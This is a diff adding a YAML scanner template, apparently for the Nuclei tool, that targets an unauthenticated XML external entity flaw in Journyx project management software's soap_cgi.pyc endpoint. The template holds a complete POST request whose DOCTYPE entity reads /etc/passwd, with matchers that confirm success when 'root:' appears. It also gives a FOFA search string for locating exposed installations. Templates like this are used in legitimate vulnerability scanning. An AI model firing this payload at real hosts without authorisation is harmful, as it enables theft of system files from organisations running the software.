@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'root:'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /jtcgi/soap_cgi.pyc HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+          Content-Type: application/xml
+
+          <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
+id: Journyx-soap_cgi-xxe
+info:
+    author: Superhero
+    description: |-
+        fofa: body="Journyx"
+        Journyx项目管理软件 soap_cgi.pyc 接口存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。
+    name: Journyx项目管理软件 soap_cgi.pyc XXE漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486243&idx=1&sn=a1baf3dc334815d10c30b70c6862c2a8&chksm=c267be10f5103706988ed4ad96ad905a778cb428ccebab1a95e564384afd8d12cc40860acf51&token=1742030890&lang=zh_CN#rd
+    severity: high
+    tags:
+        - XXE
